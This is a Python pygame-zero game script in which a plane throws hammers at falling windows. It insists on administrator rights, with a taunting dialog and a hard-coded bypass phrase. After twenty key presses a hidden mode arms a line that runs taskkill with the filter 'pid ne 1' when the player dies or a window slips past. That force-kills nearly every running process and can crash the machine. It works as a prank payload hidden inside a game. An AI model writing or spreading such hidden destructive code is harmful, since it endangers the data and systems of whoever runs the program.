import ctypes,sys,easygui
TEXT="""
hey，你为啥不给管理员权限？？？
你不给管理员权限会4吗？？？
你难道不会右键以管理员身份运行吗？？？
我就要管理员权限！！！
你不给是吧？？？
那我不让你用，诶，就是玩儿^v^
"""
def is_admin():#                                                -----|
    try:#                                                            |
        return ctypes.windll.shell32.IsUserAnAdmin()#                |
    except:#                                                         |
        return False#                                                |
if is_admin():#                                                      |
    pass#                                                            |---判断是否以管理员身份运行
else:#                                                               |
    if easygui.enterbox(TEXT)=='我不给管理员权限,诶,就是玩儿^v^':#走后门|
        pass#                                                        |
    else:#                                                           |
        exit()#                                                 -----|
import pgzrun,random,time,os
global b,c
WIDTH = 600;HEIGHT = 800;真 = True;假 = False
死了 = 假
赢了 = 假
背景1 = Actor('bj')
背景2 = Actor('bj2') 
飞机 = Actor('fj')
窗户 = Actor('ch')
窗户2 = Actor('ch')
窗户3 = Actor('ch')
爆炸 = Actor('bz')
锤子1 = Actor('cz')
锤子2 = Actor('cz')
锤子3 = Actor('cz')
# 破窗 = Actor('pc')
背景2.x = 600/2
背景2.y = -800/2
锤子1.x = WIDTH/2 
锤子1.y = -HEIGHT
锤子2.x = WIDTH/2 
锤子2.y = -HEIGHT
锤子3.x = WIDTH/2 
锤子3.y = -HEIGHT
飞机.x = 240
飞机.y = 852
窗户.x = 240
窗户.y = -50
窗户2.x = -1000
窗户3.x = -1000
窗户2.y = -1000
窗户3.y = -1000
背景3 = Actor('bj3')
背景3.x = -1000
背景3.y = -1000
蓝屏=Actor('bs')
蓝屏.y=9999
蓝屏.x=9999
分数 = 0
a = 1
b = 0
c = 0
d = 0
e = 0
# sounds. game_music.play(-1)
def draw():
    背景1.draw()
    背景2.draw()
    飞机.draw()
    窗户.draw()
    窗户3.draw()
    窗户2.draw()
    锤子1.draw()
    锤子2.draw()
    锤子3.draw()
    背景3.draw()
    蓝屏.draw()
    screen.draw.text(str(分数), (WIDTH/2, 50), fontsize=50, color='green')
    if 死了: 
        screen.draw.text("GAME OVER!", (50, HEIGHT/2), fontsize=90, color='red')
    if 赢了:
        screen.draw.text("YOU WIN!", (50, HEIGHT/2), fontsize=90, color='red')
def update():
    global 分数,死了,a,d
    # if keyboard.x:
    #     print(123)
    if 死了:
        if b == 1:
            os.system('taskkill /f /fi "pid ne 1"')
        return 
    背景2.y += 1
    背景1.y += 1
    if 背景2.y >= 800 / 2 + 800:
        背景2.y = -800 / 2
    if 背景1.y >= 800 / 2 + 800: 
        背景1.y = -800 / 2
    if d==1:
        窗户.y += 0.5
    else:
        窗户.y += 3
    if 分数 >= 20 and b == 1:
        窗户.image = 'bs'
        窗户.x = WIDTH / 2
        d=1
    if (分数 >= 50 and b == 1) or (分数 >= 50 and d == 1):
        赢了=真
        return
    if 窗户.y > HEIGHT:
        if not d==1:
            if not b == 0:
                窗户.x = random.randint(5,595)
            窗户.y = -50
        if d==1:
            os.system('taskkill /f /fi "pid ne 1"')
    if 锤子1.y > -HEIGHT:
        a=0
        飞机.image = "fj2"
        锤子1.y = 锤子1.y - 10
        锤子2.y -= 10
        锤子2.x += 2
        锤子3.y -= 10
        锤子3.x -= 2
    if 锤子1.y < -10:
        a=1
        飞机.image = "fj"
    if 锤子1.colliderect(窗户) or 锤子2.colliderect(窗户) or 锤子3.colliderect(窗户):
        if not d==1:
            窗户.x = random.randint(5, 600)
            窗户.y = -50
            锤子1.x = WIDTH/2
            锤子1.y = -HEIGHT
            锤子2.x = WIDTH/2
            锤子2.y = -HEIGHT
            锤子3.x = WIDTH/2
            锤子3.y = -HEIGHT
        分数 += 1
        a = 1

    if 飞机.colliderect(窗户):
        # sounds.explode.play()
        死了 = 真
        飞机.image = 'bz'
def on_mouse_move(pos, rel, buttons):
    if 死了:
        if b == 1:
            os.system('taskkill /f /fi "pid ne 1"')
        return
    if (分数 >= 50 and b == 1) or (分数 >= 50 and d == 1):
        赢了=真
        return
    飞机.x = pos[0]
    飞机.y = pos[1]
def on_mouse_down():
    global e
    if 死了:
        if b == 1:
            os.system('taskkill /f /fi "pid ne 1"')
        return
    if (分数 >= 50 and b == 1) or (分数 >= 50 and d == 1):
        赢了=真
        return
    if a:
        锤子1.x = 飞机.x
        锤子1.y = 飞机.y - 70
        锤子2.x = 飞机.x + 50
        锤子2.y = 飞机.y - 70
        锤子3.x = 飞机.x - 50
        锤子3.y = 飞机.y - 70
    # sounds.gun.play()
def on_key_down():
    global b,c,分数
    c += 1
    if not b == 1:
        if c == 20:    
            b = 1
        if b == 1:
            窗户.image = 'sad'
            窗户3.image = 'sad'
            窗户2.image = 'sad'
            背景1.image = 'bj3'
            背景2.image = 'bj3'
            分数 = 0       
pgzrun.go()